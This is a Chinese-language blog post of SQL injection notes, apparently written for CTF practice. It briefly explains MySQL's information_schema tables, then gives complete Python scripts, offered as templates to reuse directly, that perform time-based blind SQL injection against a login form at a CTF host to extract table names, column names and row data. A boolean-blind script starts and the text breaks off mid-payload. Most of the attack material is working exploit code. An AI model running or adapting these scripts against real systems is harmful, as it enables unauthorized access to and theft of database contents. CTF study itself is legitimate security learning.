<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="这就是--Potato" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="这就是--Potato" type="application/atom+xml"><link rel="alternate" type="application/json" title="这就是--Potato" href="https://zhewanyiershinicheng.github.io/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.17"><link rel="modulepreload" href="/js/chunk-4WOL5AEA.js"></link><link rel="modulepreload" href="/js/chunk-M2OVB55D.js"></link><link rel="modulepreload" href="/js/chunk-OEHKNEWL.js"></link><link rel="modulepreload" href="/js/copy-tex-JCSSB3EK.js"></link><link rel="modulepreload" href="/js/index.esm-H3NZFZ46.js"></link><link rel="modulepreload" href="/js/post-RFOLAXHH.js"></link><link rel="modulepreload" href="/js/quicklink-LPV2RIEA.js"></link><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="preload" href="6833939bly1gicit31ffoj20zk0m8naf.jpg" as="image" fetchpriority="high"><link rel="preload" href="6833939bly1giciszlczyj20zk0m816d.jpg" as="image" fetchpriority="high"><link rel="preload" href="6833939bly1giciryrr3rj20zk0m8nhk.jpg" as="image" fetchpriority="high"><link rel="preload" href="6833939bly1gicis3attqj20zk0m8k7l.jpg" as="image" fetchpriority="high"><link rel="preload" href="6833939bly1gicis081o9j20zk0m8dmr.jpg" as="image" fetchpriority="high"><link rel="preload" href="6833939bly1gicit4jrvuj20zk0m8785.jpg" as="image" fetchpriority="high"><meta name="keywords" content="SQL"/><meta name="description" content="bug依旧很多，反正我忍不了"/><link rel="canonical" href="https://zhewanyiershinicheng.github.io/2025/02/04/SQL%E6%B3%A8%E5%85%A5/"><title>SQL注入</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">SQL注入</h1><div class="meta"><span class="item" title="Created: 2025-02-04 22:21:23"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">Posted on</span><time itemprop="dateCreated datePublished" datetime="2025-02-04T22:21:23+08:00">2025-02-04</time></span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i></span><span class="text">Symbols count in article</span><span>15k</span><span class="text">words</span></span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i></span><span class="text">Reading time</span><span>14 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">tamato</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://7ed.net/bing/api" loading="eager" decoding="async" fetchpriority="high" alt="这就是--Potato"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">Home</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="item" rel="index" title="In技术"><span itemprop="name">技术<meta itemprop="position" content="0"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-cn"><link itemprop="mainEntityOfPage" href="https://zhewanyiershinicheng.github.io/2025/02/04/SQL%E6%B3%A8%E5%85%A5/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="开船的"/><meta itemprop="description" content="真的假的？, bug依旧很多，反正我忍不了"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="这就是--Potato"/></span><div class="body md" itemprop="articleBody"><h2 id="重要的玩意儿"><a class="anchor" href="#重要的玩意儿">#</a> 重要的玩意儿</h2>
<p>注入一定要注释后面的，使用 <code>--</code>  时注意前后要空格，要不然滚去用 <code>#</code></p>
<p><code>information_schema.tables</code>  是自带的数据库</p>
<p>其中有三个表，分别是：</p>
<p>1. <code>schemata</code></p>
<p>其中只有一个字段</p>
<p><strong> <code>schemata_name</code> 	存放所有库的库名</strong></p>
<p>2. <code>tables</code></p>
<p>俩字段</p>
<p><code>tables_schema</code> 	存放所有库的库名</p>
<p><strong> <code>table_name</code> 	存放所有表名</strong></p>
<p>3. <code>column</code></p>
<p>三个字段，前两个同 tables（完全一样，不用改名）</p>
<p><code>column_name</code> 	存放所有的字段名</p>
<h2 id="直接套用"><a class="anchor" href="#直接套用">#</a> 直接套用</h2>
<p>都是使用二分法来找</p>
<h3 id="时间盲注"><a class="anchor" href="#时间盲注">#</a> 时间盲注</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 目标 URL</span></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://challenge.ctf.rois.team:30181/'</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 提取表名</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_table_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    table_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 表的索引，从 0 开始</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        current_table <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token comment"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, SLEEP(3), 0) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                elapsed_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time</pre></td></tr><tr><td data-num="29"></td><td><pre>                <span class="token keyword">if</span> elapsed_time <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前表名</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            current_table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_table<span class="token punctuation">:</span>  <span class="token comment"># 无更多表时退出循环</span></pre></td></tr><tr><td data-num="39"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        result <span class="token operator">+=</span> current_table <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        table_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment"># 提取列名</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_column_name</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    column_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 列的索引，从 0 开始</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        current_column <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="55"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="56"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                <span class="token comment"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num="59"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">' LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, SLEEP(3), 0) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="61"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="62"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>                elapsed_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time</pre></td></tr><tr><td data-num="67"></td><td><pre>                <span class="token keyword">if</span> elapsed_time <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="68"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="69"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="70"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="71"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前列名</span></pre></td></tr><tr><td data-num="72"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="73"></td><td><pre>            current_column <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_column<span class="token punctuation">:</span>  <span class="token comment"># 无更多列时退出循环</span></pre></td></tr><tr><td data-num="77"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        result <span class="token operator">+=</span> current_column <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        column_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token comment"># 提取数据</span></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> column_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    data_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 数据的索引，从 0 开始</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        current_data <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="91"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="92"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="94"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="95"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="96"></td><td><pre>                <span class="token comment"># 构造时间盲注 payload</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string"> FROM </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, SLEEP(3), 0) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="99"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>                start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>                elapsed_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time</pre></td></tr><tr><td data-num="105"></td><td><pre>                <span class="token keyword">if</span> elapsed_time <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="106"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="107"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="108"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="109"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前数据</span></pre></td></tr><tr><td data-num="110"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="111"></td><td><pre>            current_data <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="113"></td><td><pre></pre></td></tr><tr><td data-num="114"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_data<span class="token punctuation">:</span>  <span class="token comment"># 无更多数据时退出循环</span></pre></td></tr><tr><td data-num="115"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        result <span class="token operator">+=</span> current_data <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="117"></td><td><pre>        data_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="118"></td><td><pre></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="120"></td><td><pre></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment"># 主函数</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token comment"># 提取表名</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"提取表名中..."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre>    tables <span class="token operator">=</span> extract_table_name<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的表名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>tables<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre>    <span class="token comment"># 提取列名</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    table_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入要提取列名的表名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> 的列名中..."</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre>    columns <span class="token operator">=</span> extract_column_name<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的列名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>columns<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>    <span class="token comment"># 提取数据</span></pre></td></tr><tr><td data-num="137"></td><td><pre>    column_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入要提取数据的列名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="138"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> 中列 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string"> 的数据中..."</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="139"></td><td><pre>    data <span class="token operator">=</span> extract_data<span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> column_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的数据："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="布尔盲注"><a class="anchor" href="#布尔盲注">#</a> 布尔盲注</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 目标 URL</span></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://challenge.ctf.rois.team:30181/'</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 提取表名</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_table_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    table_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 表的索引，从 0 开始</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        current_table <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token comment"># 构造注入 payload</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE 